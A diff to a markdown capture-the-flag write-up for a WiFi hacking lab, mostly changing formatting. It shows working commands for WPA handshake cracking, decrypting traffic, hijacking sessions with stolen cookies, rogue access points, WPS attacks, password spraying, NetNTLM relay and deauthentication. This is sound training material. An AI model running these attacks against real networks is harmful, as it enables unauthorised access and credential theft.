@@ -21,10 +21,10 @@ After that, we can execute airodump-ng to capture all traffic and list APs and c
 airodump-ng wlan0mon -w scan --manufacturer --wps --band abg
 ```
 
-> -w -> to save the output to scan file 
-> --manufacturer -> Display manufacturer from IEEE OUI list 
-> --wps -> Display WPS information (if any) 
-> --band abg -> to scan 2.4Ghz and 5Ghz
+> -w -> to save the output to scan file.
+> --manufacturer -> Display manufacturer from IEEE OUI list.
+> --wps -> Display WPS information (if any).
+> --band abg -> to scan 2.4Ghz and 5Ghz.
 
 As we can see the AP wifi-global is in channel 44, so we can exec airodump only in this channel.
 
@@ -166,14 +166,18 @@ This handshake can be cracked quickly with aircrack-ng or with hashcat in the ca
 ```
 aircrack-ng wifi-01.cap -w ~/rockyou.txt
 ```
-Using wifi_db
 
+Using wifi_db
 ```
 echo 'WPA*02*17b22439b2693981b0b55 ... 00fac020000*02' > hashcat.hash
+```
+```
 hashcat -a 0 -m 22000 hashcat.hash ~/rockyou.txt
 ```
+
+
 ## 09. Get users traffic passively
-Get wifi-mobile users traffic passively and get client subnet FLAG Example: 10.1.2.0/24
+> Get wifi-mobile users traffic passively and get client subnet FLAG Example: 10.1.2.0/24
 
 Solution
 To decrypt the traffic, we need to have obtained the user handshake and have the password. For this we use airdecap-ng.
@@ -186,7 +190,7 @@ This generates a cap with the traffic as if it were an Open network, so we can o
 
 
 ## 10. Verify Client isolation
-Verify Client isolation in AP wifi-mobile. Get flag from the other user's web server.
+> Verify Client isolation in AP wifi-mobile. Get flag from the other user's web server.
 
 Solution
 Configure psk.conf to connect to the AP
@@ -216,18 +220,15 @@ Access the web server using curl.
 curl 192.168.2.19
 ```
 ## 11. Login with stolen cookies
-Get wifi-mobile users traffic passively (802.11), decrypt and login with stolen cookies to wifi-mobile's AP router to get user FLAG.
+> Get wifi-mobile users traffic passively (802.11), decrypt and login with stolen cookies to wifi-mobile's AP router to get user FLAG.
 
 ### Solution :
 Using the decrypted traffic from the Challenge 09 we can find the HTTP request using cookies PHPSESSID.
 
-
 Using Firefox, we can set manually de PHPSESSID and reload to access the authenticated part.
 
-
-
 ## 12. Get wifi-office AP Password
-Get wifi-office AP Password
+> Get wifi-office AP Password
 
 ### Solution :
 We can verify that there are two clients not connected to any network sending probes for wifi-office
@@ -244,6 +245,8 @@ wpa=2
 wpa_key_mgmt=WPA-PSK
 wpa_pairwise=TKIP CCMP
 wpa_passphrase=12345678
+```
+```
 hostapd-mana hostapd.conf
 ```
 Now we can brute force the captured handshake.
@@ -267,7 +270,7 @@ Crack outside the VM or with a new version of hashcat.
 sudo hashcat -a 0 -m 22000 hash.22000 ~/rockyou.txt --force
 ```
 ## 13. Get wifi-admin AP password
-Get wifi-admin AP password
+> Get wifi-admin AP password
 
 ### Solution :
 We can check if any network uses WPS with the flag --wps.
@@ -284,24 +287,19 @@ reaver -i wlan0mon -b F0:9F:C2:71:22:33
 Another option could be to use Pixie Dust attack, but in this case is not vulnerable.
 
 
-
-
 # MGT
 
-
-
 ## 14. Get users login IDs (usernames)
-Get users login IDs (usernames) from wifi-corp clients. FLAG: DOMAIN
+> Get users login IDs (usernames) from wifi-corp clients. FLAG: DOMAIN
 
 ### Solution :
 If clients do not use anonymous identities, it is possible to obtain this information passively through the WiFi. For this we can use Wireshark looking for the responses of the clients to the EAP Identity requests.
-
 
 Or use wifi_db
 
 
 ## 15. Get cert information
-Get wifi-corp cert information. FLAG: CA email address
+> Get wifi-corp cert information. FLAG: CA email address
 
 ### Solution :
 We can use pcapFilter.sh to display the certificates used by APs with MGT.
@@ -358,7 +356,7 @@ hashcat -a 0 -m 5500 juan.tr::::...:1be06d07bcdd5a69 ~/rockyou.txt --force
 ```
 
 ## 18. Brute force user test
-Brute force user CONTOSOLAB\test
+> Brute force user CONTOSOLAB\test
 
 ### Solution :
 We can brute force the user using air-hammer
@@ -369,7 +367,7 @@ echo 'CONTOSOLAB\test' > test.user
 ```
 
 ## 19. Login with user with password 12345678
-Login with user with password 12345678 (is in top-usernames-shortlist.txt). FLAG: Username
+> Login with user with password 12345678 (is in top-usernames-shortlist.txt). FLAG: Username
 
 ### Solution
 This challenge it's similar to the last one, so we can use the same tool or eaphammer (eaphammer is faster). But first we have to modify the list inserting the DOMAIN.
@@ -392,7 +390,7 @@ python3 ./eaphammer --eap-spray \
     --user-list ~/top-usernames-shortlist-contoso.txt
 ```
 ## 20. Connect to the network with Luis user without cracking their password
-Connect to the network wifi-regional with the Luis's account without cracking his password (it's impossible to crack). Then access Router and get the FLAG
+> Connect to the network wifi-regional with the Luis's account without cracking his password (it's impossible to crack). Then access Router and get the FLAG
 
 ### Solution
 In the case of having the NetNTLM hash of the user but not being able to crack it, a Creds Relay attack can be carried out using sycophant.
@@ -443,7 +441,7 @@ dhclient wlan3mon -v
 ```
 
 ### 21. Get CA from the Router using default creds
-Get CA from the Router using default creds FLAG: CA web folder name
+> Get CA from the Router using default creds FLAG: CA web folder name
 
 ### Solution
 The folder name is in the last capture, int he URL http://192.168.6.1/index.php. Download and rename the files.
@@ -456,7 +454,7 @@ mv dh.txt dh
 mv server.crt.txt server.crt
 ```
 ### 22. Get wifi-corp Administrator password using the CA
-Get the other wifi-corp USER (Administrator) password using the CA
+> Get the other wifi-corp USER (Administrator) password using the CA
 
 ### Solution
 Once the CA and the AP certificate have been downloaded, we can impersonate the AP so that the client that verified the certificate can connect. To this we import the certificate to eaphammer.
@@ -468,7 +466,7 @@ python3 ./eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp --creds --negotiat
 aireplay-ng -0 0 -a F0:9F:C2:71:22:55 wlan0mon -c 10:F9:6F:BA:6C:11
 ```
 ### 23. Login to wifi-global Administrator web creds
-Once we have the certificate, we can create a client certificate using: https://wiki.innovaphone.com/index.php?title=Howto:802.1X_EAP-TLS_With_FreeRadius
+> Once we have the certificate, we can create a client certificate using: https://wiki.innovaphone.com/index.php?title=Howto:802.1X_EAP-TLS_With_FreeRadius
 
 Download the client certificate and connect to wifi-global with user GlobalAdmin to get FLAG from HTTP server
 
